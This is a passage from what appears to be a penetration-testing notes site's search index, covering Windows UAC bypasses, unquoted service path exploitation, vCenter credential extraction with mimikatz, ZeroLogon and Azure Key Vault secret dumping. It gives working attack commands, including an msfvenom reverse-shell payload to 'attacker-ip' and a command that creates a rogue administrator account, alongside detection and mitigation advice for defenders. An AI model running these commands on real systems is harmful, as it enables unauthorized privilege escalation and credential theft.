</ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1562002","#stage/configuration-management","#os/linux","#tool/netplan"]},{"location":"Active%20Directory/flat/static_ip/#mitigation","title":"Mitigation","text":"<ul> <li> <p>Principle of Least Privilege: Restrict access to the sudo group and other users who can modify system files.</p> </li> <li> <p>Configuration Management: Use a configuration management tool like Ansible or Puppet to manage network settings, ensuring changes are tracked and auditable.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1562002","#stage/configuration-management","#os/linux","#tool/netplan"]},{"location":"Active%20Directory/flat/uac_bypasses/","title":"Uac bypasses","text":"","tags":["#type/technique","#stage/privilege-escalation","#tactic/TA0004","#os/windows","#topic/uac"]},{"location":"Active%20Directory/flat/uac_bypasses/#technique","title":"Technique","text":"<p>User Account Control (UAC) Bypasses are methods to elevate privileges on a Windows system without triggering the UAC prompt that normally requires user consent. When successful, these techniques allow an attacker to elevate from a medium integrity process to a high integrity (administrative) process without user interaction.</p> <p>UAC is a Windows security feature that helps prevent unauthorized changes to the operating system. Even when logged in as an administrator, processes run at medium integrity by default, and administrative actions require explicit approval via the UAC prompt. Bypassing this mechanism allows attackers to perform privileged operations silently.</p>","tags":["#type/technique","#stage/privilege-escalation","#tactic/TA0004","#os/windows","#topic/uac"]},{"location":"Active%20Directory/flat/uac_bypasses/#prerequisites","title":"Prerequisites","text":"<p>Access Level: The user must be a member of the local Administrators group. UAC bypasses do not work for standard users.</p> <p>System State: Effectiveness depends on the target's Windows version, patch level, and UAC settings (most bypasses work only on default settings or lower).</p> <p>UAC Settings: Most bypasses are effective against the default UAC setting (\"Notify me only when apps try to make changes to my computer\"). Fewer bypasses work against the highest setting (\"Always notify\").</p>","tags":["#type/technique","#stage/privilege-escalation","#tactic/TA0004","#os/windows","#topic/uac"]},{"location":"Active%20Directory/flat/uac_bypasses/#considerations","title":"Considerations","text":"<p>Impact</p> <p>Successfully bypassing UAC allows an attacker to execute commands with elevated privileges without user interaction, potentially leading to further system compromise.</p> <p>OPSEC</p> <ul> <li>UAC bypass attempts may be logged in Windows Event Logs.</li> <li>Some bypass techniques may create temporary files or registry entries that could be detected.</li> <li>Modern Windows systems have patched many known UAC bypass techniques.</li> </ul>","tags":["#type/technique","#stage/privilege-escalation","#tactic/TA0004","#os/windows","#topic/uac"]},{"location":"Active%20Directory/flat/uac_bypasses/#execution","title":"Execution","text":"","tags":["#type/technique","#stage/privilege-escalation","#tactic/TA0004","#os/windows","#topic/uac"]},{"location":"Active%20Directory/flat/uac_bypasses/#auto-elevating-processes","title":"Auto-Elevating Processes","text":"<p>Many UAC bypasses exploit Windows executables that have the \"auto-elevate\" property. When these executables are launched, Windows allows them to elevate to high integrity without a UAC prompt.</p> <p>Examples include: - fodhelper.exe: Settings application that auto-elevates - eventvwr.exe: Event Viewer utility - sdclt.exe: Backup and Restore utility - computerdefaults.exe: Default Programs utility - slui.exe: Windows Activation interface</p>","tags":["#type/technique","#stage/privilege-escalation","#tactic/TA0004","#os/windows","#topic/uac"]},{"location":"Active%20Directory/flat/uac_bypasses/#registry-key-manipulation","title":"Registry Key Manipulation","text":"<p>Most auto-elevation bypasses follow this pattern: 1. Modify registry keys that control where the auto-elevating process looks for DLLs or executables 2. Place a malicious payload in that location 3. Launch the auto-elevating process, which executes the payload with high integrity</p>","tags":["#type/technique","#stage/privilege-escalation","#tactic/TA0004","#os/windows","#topic/uac"]},{"location":"Active%20Directory/flat/uac_bypasses/#fodhelper-uac-bypass-example","title":"Fodhelper UAC Bypass Example","text":"<p>Fodhelper.exe is an auto-elevating executable introduced in Windows 10 that can be abused:</p> <pre><code># Create registry keys to hijack fodhelper.exe execution\nNew-Item -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Force\nNew-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"(default)\" -Value \"cmd.exe /c start powershell.exe\" -Force\n\n# Execute fodhelper.exe to trigger the bypass\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\"\n</code></pre>","tags":["#type/technique","#stage/privilege-escalation","#tactic/TA0004","#os/windows","#topic/uac"]},{"location":"Active%20Directory/flat/uac_bypasses/#event-viewer-uac-bypass-works-on-windows-7-8-81","title":"Event Viewer UAC Bypass (Works on Windows 7, 8, 8.1)","text":"<pre><code># Create required registry modifications\nNew-Item -Path \"HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"cmd.exe /c start powershell.exe\" -Force\n\n# Launch Event Viewer to trigger the bypass\nStart-Process \"C:\\Windows\\System32\\eventvwr.exe\"\n</code></pre>","tags":["#type/technique","#stage/privilege-escalation","#tactic/TA0004","#os/windows","#topic/uac"]},{"location":"Active%20Directory/flat/uac_bypasses/#using-uacme-project","title":"Using UACME Project","text":"<p>The UACME project catalogs and implements numerous UAC bypass techniques:</p> <pre><code># Example using Akagi (UACME) with method #33\nAkagi.exe 33 \"c:\\windows\\system32\\cmd.exe\"\n</code></pre>","tags":["#type/technique","#stage/privilege-escalation","#tactic/TA0004","#os/windows","#topic/uac"]},{"location":"Active%20Directory/flat/uac_bypasses/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#stage/privilege-escalation","#tactic/TA0004","#os/windows","#topic/uac"]},{"location":"Active%20Directory/flat/uac_bypasses/#detection","title":"Detection","text":"<ul> <li>Monitor for creation of suspicious registry keys under HKCU that mirror system paths</li> <li>Watch for process creation events where a medium integrity process spawns a high integrity child without a UAC prompt</li> <li>Look for modifications to environment variables just before launching system executables</li> <li>Monitor for unusual parent-child process relationships involving auto-elevating executables</li> <li>Look for unexpected DLL loading or COM object instantiation</li> </ul>","tags":["#type/technique","#stage/privilege-escalation","#tactic/TA0004","#os/windows","#topic/uac"]},{"location":"Active%20Directory/flat/uac_bypasses/#mitigation","title":"Mitigation","text":"<ul> <li>Configure UAC to the highest setting (\"Always notify me\")</li> <li>Keep systems updated with the latest security patches</li> <li>Use application control solutions to restrict execution of known bypass tools</li> <li>Implement the principle of least privilege for user accounts</li> <li>Consider using the Protected Administrator account mode</li> <li>Deploy Microsoft's Attack Surface Reduction rules to block suspicious behaviors</li> <li>For high-security environments, disable local administrator accounts entirely and use a tiered administration model</li> </ul>","tags":["#type/technique","#stage/privilege-escalation","#tactic/TA0004","#os/windows","#topic/uac"]},{"location":"Active%20Directory/flat/unquoted_service_path/","title":"Unquoted service path","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1574.009","#stage/privilege-escalation","#os/windows","#tool/powerup","#tool/accesschk"]},{"location":"Active%20Directory/flat/unquoted_service_path/#technique","title":"Technique","text":"<p>The Unquoted Service Path vulnerability occurs when a Windows service is configured with a path that: 1. Contains spaces in the path 2. Is not enclosed in quotation marks</p> <p>When Windows attempts to locate and execute the service binary, it will first try to interpret each space as a delimiter between the program name and its arguments. This creates an opportunity for an attacker to place a malicious executable in one of the intermediate directories, which Windows will execute with the privileges of the vulnerable service (often SYSTEM).</p> <p>For example, if a service has a path set to: <pre><code>C:\\Program Files\\My Service\\service.exe\n</code></pre></p> <p>Windows will attempt to execute files in the following order: 1. <code>C:\\Program.exe</code> 2. <code>C:\\Program Files\\My.exe</code> 3. <code>C:\\Program Files\\My Service\\service.exe</code></p> <p>If an attacker can write to any of the earlier directories, they can place a malicious executable that Windows will run with the service's privileges when the service starts.</p>","tags":["#type/technique","#tactic/TA0004","#technique/T1574.009","#stage/privilege-escalation","#os/windows","#tool/powerup","#tool/accesschk"]},{"location":"Active%20Directory/flat/unquoted_service_path/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Local user account with write permissions to at least one of the intermediate directories in the service path.</p> <p>System State:  - A Windows service with an unquoted path containing spaces - The ability to restart the service or wait for a system reboot</p>","tags":["#type/technique","#tactic/TA0004","#technique/T1574.009","#stage/privilege-escalation","#os/windows","#tool/powerup","#tool/accesschk"]},{"location":"Active%20Directory/flat/unquoted_service_path/#identification","title":"Identification","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1574.009","#stage/privilege-escalation","#os/windows","#tool/powerup","#tool/accesschk"]},{"location":"Active%20Directory/flat/unquoted_service_path/#using-wmic","title":"Using WMIC","text":"<pre><code>wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\"\"\n</code></pre> <p>This command: - Lists all services - Filters for services that start automatically - Excludes services in the Windows directory (which are typically secure) - Excludes services with quoted paths</p>","tags":["#type/technique","#tactic/TA0004","#technique/T1574.009","#stage/privilege-escalation","#os/windows","#tool/powerup","#tool/accesschk"]},{"location":"Active%20Directory/flat/unquoted_service_path/#using-powershell","title":"Using PowerShell","text":"<pre><code>Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '\"*\"' -and $_.PathName -like '* *'} | Select-Object Name, PathName, StartMode\n</code></pre>","tags":["#type/technique","#tactic/TA0004","#technique/T1574.009","#stage/privilege-escalation","#os/windows","#tool/powerup","#tool/accesschk"]},{"location":"Active%20Directory/flat/unquoted_service_path/#using-powerup-powersploit","title":"Using PowerUp (PowerSploit)","text":"<pre><code>Import-Module .\\PowerUp.ps1\nGet-UnquotedService\n</code></pre>","tags":["#type/technique","#tactic/TA0004","#technique/T1574.009","#stage/privilege-escalation","#os/windows","#tool/powerup","#tool/accesschk"]},{"location":"Active%20Directory/flat/unquoted_service_path/#using-sc-command","title":"Using sc Command","text":"<p>Check a specific service: <pre><code>sc qc \"Service Name\"\n</code></pre></p> <p>Look for <code>BINARY_PATH_NAME</code> that contains spaces and isn't enclosed in quotes.</p>","tags":["#type/technique","#tactic/TA0004","#technique/T1574.009","#stage/privilege-escalation","#os/windows","#tool/powerup","#tool/accesschk"]},{"location":"Active%20Directory/flat/unquoted_service_path/#exploitation","title":"Exploitation","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1574.009","#stage/privilege-escalation","#os/windows","#tool/powerup","#tool/accesschk"]},{"location":"Active%20Directory/flat/unquoted_service_path/#exploitation-process","title":"Exploitation Process","text":"<ol> <li> <p>Identify the vulnerable service and its path:    <pre><code>sc qc \"Vulnerable Service\"\n</code></pre></p> </li> <li> <p>Check write permissions on intermediate directories:    <pre><code>icacls \"C:\\Program Files\"\nicacls \"C:\\Program Files\\My Service\"\n</code></pre></p> </li> <li> <p>Create a malicious executable:    <pre><code># Simple reverse shell payload\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker-ip LPORT=4444 -f exe -o Program.exe\n</code></pre></p> </li> <li> <p>Place the executable in the writable directory:    <pre><code>copy Program.exe \"C:\\Program.exe\"\n</code></pre></p> </li> <li> <p>Restart the service or wait for system reboot:    <pre><code>sc stop \"Vulnerable Service\"\nsc start \"Vulnerable Service\"\n</code></pre></p> </li> </ol>","tags":["#type/technique","#tactic/TA0004","#technique/T1574.009","#stage/privilege-escalation","#os/windows","#tool/powerup","#tool/accesschk"]},{"location":"Active%20Directory/flat/unquoted_service_path/#automated-exploitation-with-powerup","title":"Automated Exploitation with PowerUp","text":"<pre><code>Write-ServiceBinary -Name \"Vulnerable Service\" -Path \"C:\\Program.exe\" -Command \"net user hacker Password123! /add &amp;&amp; net localgroup administrators hacker /add\"\n</code></pre>","tags":["#type/technique","#tactic/TA0004","#technique/T1574.009","#stage/privilege-escalation","#os/windows","#tool/powerup","#tool/accesschk"]},{"location":"Active%20Directory/flat/unquoted_service_path/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1574.009","#stage/privilege-escalation","#os/windows","#tool/powerup","#tool/accesschk"]},{"location":"Active%20Directory/flat/unquoted_service_path/#detection","title":"Detection","text":"<ul> <li>Monitor for the creation of unexpected executables in root directories and program file paths</li> <li>Watch for service binary changes or modifications to service configurations</li> <li>Look for unusual processes spawned by services</li> <li>Monitor for changes to permissions on service directories</li> </ul>","tags":["#type/technique","#tactic/TA0004","#technique/T1574.009","#stage/privilege-escalation","#os/windows","#tool/powerup","#tool/accesschk"]},{"location":"Active%20Directory/flat/unquoted_service_path/#mitigation","title":"Mitigation","text":"<ol> <li> <p>Properly quote service paths:    <pre><code>sc config \"Service Name\" binpath= \"\\\"C:\\Program Files\\My Service\\service.exe\\\"\"\n</code></pre></p> </li> <li> <p>Restrict write permissions on application directories:    <pre><code>icacls \"C:\\Program Files\" /deny Users:(W)\nicacls \"C:\\Program\" /deny Users:(W)\n</code></pre></p> </li> <li> <p>Use Windows Installer for service installation, which properly quotes paths</p> </li> <li> <p>Implement application whitelisting to prevent unauthorized executables from running</p> </li> <li> <p>Regularly audit services for unquoted paths:    <pre><code>Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '\"*\"' -and $_.PathName -like '* *'} | Select-Object Name, PathName\n</code></pre></p> </li> <li> <p>Place services in directories without spaces, such as <code>C:\\Services\\MyService\\service.exe</code> instead of paths with spaces</p> </li> <li> <p>Keep Windows updated with the latest security patches</p> </li> </ol>","tags":["#type/technique","#tactic/TA0004","#technique/T1574.009","#stage/privilege-escalation","#os/windows","#tool/powerup","#tool/accesschk"]},{"location":"Active%20Directory/flat/vmware_vCenter_vSphere/","title":"vmware vCenter vSphere","text":""},{"location":"Active%20Directory/flat/vmware_vCenter_vSphere/#vcenter-backup-file-vcenter-administrator","title":"vCenter backup file --&gt; vCenter Administrator","text":"<p>You can parse the <code>data.mdb</code> file to extract the local SSO signing certs, make a request with the forged SAML token and get Administrator cookies.</p> <p>Look for vCenter backups, they should contain the <code>lotus_backup.tar.gz</code> file. Extract the <code>data.mdb</code> file and run this tool.</p> <pre><code>git clone https://github.com/theol-syn/vcenter_saml_login.git; cd vcenter_saml_login\npython3 vcenter_saml_login.py -p data.mdb -t &lt;vCenterIp&gt;\n</code></pre> <p>If successful, you'll get admin cookies. Visit the <code>sphere.domain.local/ui</code> path (make sure the cookies match that path) and you should be administrator.</p> <p>ref: https://horizon3.ai/attack-research/attack-blogs/compromising-vcenter-via-saml-certificates/</p>"},{"location":"Active%20Directory/flat/vmware_vCenter_vSphere/#vcenter-access-domain-admin","title":"vCenter access --&gt; Domain Admin","text":"<p>From vCenter we have several paths to gain more privileges. </p>"},{"location":"Active%20Directory/flat/vmware_vCenter_vSphere/#vm-vmdk-credential-extraction","title":"VM VMDK Credential Extraction","text":"<p>This is the easiest option, we just clone a target box's (hopefully a DCs) <code>.vmdk</code> and mount it to box you have control over. Then grab the NTDS (or sam, system, security).</p> <p>Clone vmdk</p> <ul> <li>Login to vCenter (HTML5 UI).</li> <li>Power Off Target DC (if possible; else snapshot first):<ul> <li>Right-click VM \u2192 Power \u2192 Power Off.</li> </ul> </li> <li>Snapshot VM (Disk-Only):<ul> <li>Right-click VM \u2192 Snapshots \u2192 Take Snapshot.</li> <li>Name: <code>CredExtract-Snap</code>.</li> <li>Uncheck \"Snapshot the virtual machine's memory\".</li> <li>Check \"Quiesce guest file system\" (VSS for consistency).</li> <li>OK \u2192 Creates <code>.vmdk delta</code> files.</li> </ul> </li> <li>Clone VMDK to Analysis Datastore:<ul> <li>Datastore Browser: vCenter \u2192 Storage \u2192 Select datastore \u2192 Datastore Browser.</li> <li>Navigate: <code>VM-folder/DC-VM/</code> \u2192 Copy entire disk folder (e.g., <code>DC-VM/DC-VM.vmdk</code>, <code>DC-VM-flat.vmdk</code>, <code>DC-VM.vmsd</code>).<ul> <li>Right-click folder \u2192 Copy to \u2192 Target datastore (analysis VM's).</li> </ul> </li> <li>Rename clone: <code>DC-VM-clone.vmdk</code>.</li> </ul> </li> </ul> <p>Attach Cloned VMDK to controlled VM</p> <ol> <li>Power Off Analysis VM in vSphere.</li> <li>Edit VM Settings:<ul> <li>Right-click \u2192 Edit Settings \u2192 Add New Device \u2192 Existing Hard Disk.</li> <li>Browse datastore \u2192 Select <code>DC-clone.vmdk</code>.</li> <li>OK (appears as extra disk, e.g., Disk 1).</li> </ul> </li> <li>Power On VM.</li> </ol> <p>Windows should identify disk and assign drive letter.</p> <pre><code>dir E:\\Windows\\NTDS\\\nxcopy E:\\Windows\\NTDS\\ntds.dit C:\\dc-extract\\ /Y\nxcopy E:\\Windows\\System32\\config\\SYSTEM C:\\dc-extract\\ /Y\nxcopy E:\\Windows\\System32\\config\\SECURITY C:\\dc-extract\\ /Y\nxcopy E:\\Windows\\System32\\config\\SAM C:\\dc-extract\\ /Y\n</code></pre> <p>Pull hashes with secretsdump <pre><code>impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL\n</code></pre></p>"},{"location":"Active%20Directory/flat/vmware_vCenter_vSphere/#vm-snapshot-vmem-credential-extraction","title":"VM Snapshot vmem Credential Extraction","text":"<p>Choose target VM right click --&gt; Snapshot --&gt; take snapshot --&gt; include memory. Go to datastores, find snapshot files, download <code>*.vmem</code> &amp; <code>*.vmsn</code> at the same time (important for differing storage methods, downloading together ensures complete data).</p> <p>Install windbg <pre><code>https://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKDebuggingTools_amd64/dbg_amd64.msi\n</code></pre></p> <p>Get x64 version of mimilib.dll. <pre><code>wget https://github.com/ParrotSec/mimikatz/blob/master/x64/mimilib.dll\n</code></pre></p> <p>Install both x86 &amp; x64 runtimes from (for vmss2core) <pre><code>https://www.microsoft.com/en-us/download/details.aspx?id=40784\n</code></pre></p> <p>Convert vmem to memdump</p> <p>[!Note] OS Version  If the target VM is Microsoft Windows 8/8.1, Windows Server 2012, Windows Server 2016 or Windows Server 2019 then execute with -W8, otherwise just -W</p> <pre><code>vmss2core-sb-8456865.exe -W8 dothisoneirst.vmsn thisonesecond.vmem\n</code></pre> <p>Then open windbg --&gt; file --&gt; Open Crash Dump --&gt; memory.dmp</p> <p>If not already installed, load symbols <pre><code>.sympath SRV*f:\\localsymbols*http://msdl.microsoft.com/download/symbols\n.reload\n</code></pre></p> <p>Find lsass memory address <pre><code>!process 0 0 lsass.exe\n</code></pre></p> <p>Load mimilib <pre><code>.load C:\\tools\\mimilib.dll\n</code></pre></p> <p>And attach to process <pre><code>.process /r /p ffffc3037706b080\n</code></pre></p> <p>Run mimikatz <pre><code>!mimikatz\n</code></pre></p> <p>References - https://blog.carnal0wnage.com/2014/06/mimikatz-against-virtual-machine-memory.html - https://jamescoote.co.uk/Dumping-LSASS-with-SharpShere/</p>"},{"location":"Active%20Directory/flat/zerologon/","title":"Zerologon","text":"","tags":["#type/technique","#tactic/TA0001","#tactic/TA0004","#technique/T1558.001","#stage/initial-access","#stage/privilege-escalation","#os/windows","#protocol/netlogon","#tool/netexec","#cve/CVE-2020-1472"]},{"location":"Active%20Directory/flat/zerologon/#technique","title":"Technique","text":"<p>ZeroLogon (CVE-2020-1472) is a critical vulnerability in the Microsoft Windows Netlogon Remote Protocol (MS-NRPC) discovered in 2020. This vulnerability allows an unauthenticated attacker with network access to a domain controller to completely compromise the Active Directory domain.</p> <p>The vulnerability stems from a cryptographic flaw in the Netlogon authentication process, where under certain circumstances, the initialization vector (IV) of AES-CFB8 mode becomes all zeros. This allows an attacker to:</p> <ol> <li>Impersonate any computer account in the domain, including domain controllers</li> <li>Set an empty password for the domain controller computer account</li> <li>Use this compromised account to gain domain admin privileges</li> </ol>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0004","#technique/T1558.001","#stage/initial-access","#stage/privilege-escalation","#os/windows","#protocol/netlogon","#tool/netexec","#cve/CVE-2020-1472"]},{"location":"Active%20Directory/flat/zerologon/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Network access to a domain controller (no prior authentication required)</p> <p>System State: Unpatched domain controller vulnerable to CVE-2020-1472 (pre-August 2020 or without security updates)</p> <p>Tools: NetExec (formerly CrackMapExec) with zerologon module, or a specialized ZeroLogon exploit script</p>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0004","#technique/T1558.001","#stage/initial-access","#stage/privilege-escalation","#os/windows","#protocol/netlogon","#tool/netexec","#cve/CVE-2020-1472"]},{"location":"Active%20Directory/flat/zerologon/#considerations","title":"Considerations","text":"<p>Impact</p> <p>Successful exploitation provides complete domain compromise, allowing an attacker to: - Reset any password in the domain - Add new domain admin accounts - Modify security configurations - Access any resource in the domain</p> <p>OPSEC</p> <ul> <li>Extreme Risk of Detection: ZeroLogon exploitation is highly detectable</li> <li>Domain Stability Risk: Improper exploitation can break domain functionality by corrupting the computer account password for the domain controller</li> <li>Microsoft Monitoring: Microsoft actively monitors for ZeroLogon exploitation attempts</li> </ul> <p>WARNING: This vulnerability is extremely dangerous and can easily cause domain-wide outages if exploited incorrectly. Do not attempt to exploit this vulnerability on production systems without explicit authorization and a recovery plan.</p>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0004","#technique/T1558.001","#stage/initial-access","#stage/privilege-escalation","#os/windows","#protocol/netlogon","#tool/netexec","#cve/CVE-2020-1472"]},{"location":"Active%20Directory/flat/zerologon/#identification","title":"Identification","text":"<p>Check if a domain controller is vulnerable using NetExec:</p> <pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M zerologon\n</code></pre> <p>https://github.com/SecuraBV/CVE-2020-1472</p> <pre><code>python3 zerologon_tester.py domain.local &lt;dc-ip&gt;\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0004","#technique/T1558.001","#stage/initial-access","#stage/privilege-escalation","#os/windows","#protocol/netlogon","#tool/netexec","#cve/CVE-2020-1472"]},{"location":"Active%20Directory/flat/zerologon/#exploitation","title":"Exploitation","text":"<p>While exploitation details are deliberately not provided in full to prevent misuse, the general process involves:</p> <ol> <li>Exploiting the cryptographic flaw to bypass authentication</li> <li>Setting an empty password for the domain controller computer account</li> <li>Using this account to gain domain admin privileges (typically via DCSync)</li> <li>Restoring the original password to prevent domain disruption</li> </ol>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0004","#technique/T1558.001","#stage/initial-access","#stage/privilege-escalation","#os/windows","#protocol/netlogon","#tool/netexec","#cve/CVE-2020-1472"]},{"location":"Active%20Directory/flat/zerologon/#recovery","title":"Recovery","text":"<p>If exploitation occurs without proper restoration of the domain controller's machine account password, the domain controller will be unable to authenticate to the domain, potentially causing widespread service disruption.</p> <p>Recovery steps may include: 1. Restore from backups 2. Seize FSMO roles to another domain controller 3. Restore proper machine account passwords 4. In extreme cases, rebuild the domain from scratch</p>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0004","#technique/T1558.001","#stage/initial-access","#stage/privilege-escalation","#os/windows","#protocol/netlogon","#tool/netexec","#cve/CVE-2020-1472"]},{"location":"Active%20Directory/flat/zerologon/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0001","#tactic/TA0004","#technique/T1558.001","#stage/initial-access","#stage/privilege-escalation","#os/windows","#protocol/netlogon","#tool/netexec","#cve/CVE-2020-1472"]},{"location":"Active%20Directory/flat/zerologon/#detection","title":"Detection","text":"<ul> <li>Monitor for Event ID 5805 (Netlogon errors) on domain controllers</li> <li>Look for unauthorized password reset attempts for domain controller computer accounts</li> <li>Watch for failed Netlogon secure channel establishment</li> <li>Monitor for unusual RPC traffic to domain controllers on port 135/TCP</li> </ul>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0004","#technique/T1558.001","#stage/initial-access","#stage/privilege-escalation","#os/windows","#protocol/netlogon","#tool/netexec","#cve/CVE-2020-1472"]},{"location":"Active%20Directory/flat/zerologon/#mitigation","title":"Mitigation","text":"<ol> <li>Apply Microsoft Security Updates:</li> <li>August 2020 Security Update (initial mitigation)</li> <li> <p>February 2021 Security Update (enforcement mode)</p> </li> <li> <p>Enable Netlogon secure channel enforcement mode:    <pre><code># Check current enforcement mode\nGet-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters\" -Name \"FullSecureChannelProtection\"\n\n# Enable enforcement mode\nNew-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters\" -Name \"FullSecureChannelProtection\" -Value 1 -PropertyType DWORD -Force\n</code></pre></p> </li> <li> <p>Monitor for exploitation attempts</p> </li> <li> <p>Implement network segmentation to limit access to domain controllers</p> </li> <li> <p>Use a tiered administration model to minimize exposure of privileged accounts</p> </li> </ol>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0004","#technique/T1558.001","#stage/initial-access","#stage/privilege-escalation","#os/windows","#protocol/netlogon","#tool/netexec","#cve/CVE-2020-1472"]},{"location":"Azure/","title":"Index","text":"<p>no checklist yet check back later &lt;3 sorry!</p>"},{"location":"Azure/administrative_units/","title":"Administrative units","text":""},{"location":"Azure/administrative_units/#enumeration","title":"Enumeration","text":""},{"location":"Azure/administrative_units/#azure-cli","title":"Azure CLI","text":"<p>List all administrative units <pre><code>az rest --method GET --uri \"https://graph.microsoft.com/v1.0/directory/administrativeUnits\"\n</code></pre></p> <p>Get AU Info <pre><code>az rest --method GET --uri \"https://graph.microsoft.com/v1.0/directory/administrativeUnits/&lt;au-id&gt;\"\n</code></pre></p> <p>Get members <pre><code>az rest --method GET --uri \"https://graph.microsoft.com/v1.0/directory/administrativeUnits/&lt;au-id&gt;/members\"\n</code></pre></p> <p>Get principals with roles over the AU <pre><code>az rest --method GET --uri \"https://graph.microsoft.com/v1.0/directory/administrativeUnits/&lt;au-id&gt;/scopedRoleMembers\"\n</code></pre></p>"},{"location":"Azure/azure_keyvault/","title":"Azure keyvault","text":""},{"location":"Azure/azure_keyvault/#identify","title":"Identify","text":"<p>Login and validate: <pre><code>az login\naz account show\n</code></pre></p> <p>Get graph session: <pre><code>Install-Module Microsoft.Graph\nImport-Module Microsoft.Graph.Users\nConnect-MgGraph\nInstall-Module Az\nImport-Module Az\nConnect-AzAccount\n</code></pre></p> <p>Validate graph <pre><code>Get-MgContext\n</code></pre></p> <p>Check user <pre><code>az ad signed-in-user show\n</code></pre></p> <p>Check for group membership</p> <pre><code>Get-MgUserMemberOf -userid \"user@domain.com\" | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties[\"displayName\"]}\n</code></pre> <p>Get subscription ID: <pre><code>Get-AzSubscription | Select-Object Name, Id\n</code></pre></p> <p>Check for other azure permissions</p> <pre><code># Given subscription ID\n$CurrentSubscriptionID = \"&lt;sub id&gt;\"\n\n# Set output format\n$OutputFormat = \"table\"\n\n# Set the given subscription as the active one\n&amp; az account set --subscription $CurrentSubscriptionID\n\n# List resources in the current subscription\n&amp; az resource list -o $OutputFormat\n</code></pre> <p>Look for keyvault resource types and note resource name. </p> <p>Then, enumerate secrets stored in the vault</p> <pre><code># Set variables\n$VaultName = \"&lt;vault name&gt;\"\n\n# Set the current Azure subscription\n$SubscriptionID = \"&lt;sub-id&gt;\"\naz account set --subscription $SubscriptionID\n\n# List and store the secrets\n$secretsJson = az keyvault secret list --vault-name $VaultName -o json\n\n$secrets = $secretsJson | ConvertFrom-Json\n\n# List and store the keys\n$keysJson = az keyvault key list --vault-name $VaultName -o json\n\n$keys = $keysJson | ConvertFrom-Json\n\n# Output the secrets\nWrite-Host \"Secrets in vault $VaultName\"\nforeach ($secret in $secrets) {\n    Write-Host $secret.id\n}\n\n# Output the keys\nWrite-Host \"Keys in vault $VaultName\"\nforeach ($key in $keys) {\n    Write-Host $key.id\n}\n</code></pre> <p>or with powershell module <pre><code>Get-AzKeyVaultSecret -VaultName 'ext-contractors' | Select-Object Name\n</code></pre></p> <p>Read stored secrets:</p> <p>script kinda sucks <pre><code># Set variables\n$VaultName = \"&lt;vaul-name&gt;\"\n$SecretNames = @(\"&lt;nameofsecret&gt;\", \"ameofsecret2\", \"nameofsecret3\")\n\n# Set the current Azure subscription\n$SubscriptionID = \"&lt;sub id&gt;\"\naz account set --subscription $SubscriptionID\n\n# Retrieve and output the secret values\nWrite-Host \"Secret Values from vault $VaultName\"\nforeach ($SecretName in $SecretNames) {\n    $secretValueJson = az keyvault secret show --name $SecretName --vault-name $VaultName -o json\n    $secretValue = ($secretValueJson | ConvertFrom-Json).value\n    Write-Host \"$SecretName - $secretValue\"\n}\n</code></pre></p> <p>Better script? <pre><code>$VaultName = \"secrets-vault\"\n\nGet-AzKeyVaultSecret -VaultName $VaultName | ForEach-Object { Get-AzKeyVaultSecret -VaultName $VaultName -Name $_.Name -asplaintext }\n</code></pre></p> <p>One at at a time: <pre><code>az keyvault secret show --name &lt;name&gt; --vault-name &lt;vault&gt; -o json\n</code></pre></p> <p>If these happen to be user credentials, we can validate the users still exist with: show active users:</p> <p>You might need to use just first name (case sensitive) for this <pre><code>az ad user list --query \"[?givenName=='user1' || givenName=='user2' || givenName=='user3'].{Name:displayName, UPN:userPrincipalName, JobTitle:jobTitle}\" -o table\n</code></pre></p> <p>This will return info on only existing users. Assuming we have a user here, lets grab its objectID for further enumeration <pre><code>Get-MgUser -UserId user@domain.com\n</code></pre> (note down object ID)</p> <p>Further enumerate users groups with object ID: <pre><code>$UserId = 'OBJECT ID'\nGet-MgUserMemberOf -userid $userid | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties[\"displayName\"]}\n</code></pre></p> <p>Any extra privs?</p> <p>With curl <pre><code>$vaultName = \"vualtname\"\n$apiVersion = \"7.1\"\n$accessToken = 'token'\n$headers = @{\n'Authorization' = \"Bearer $accessToken\"\n'Content-Type' = 'application/json'\n}\n$uri = \"https://$vaultName.vault.azure.net/secrets?api-version=$apiVersion\"\n$response = Invoke-RestMethod -Uri $uri -Method Get -Headers $headers\n$response.value | 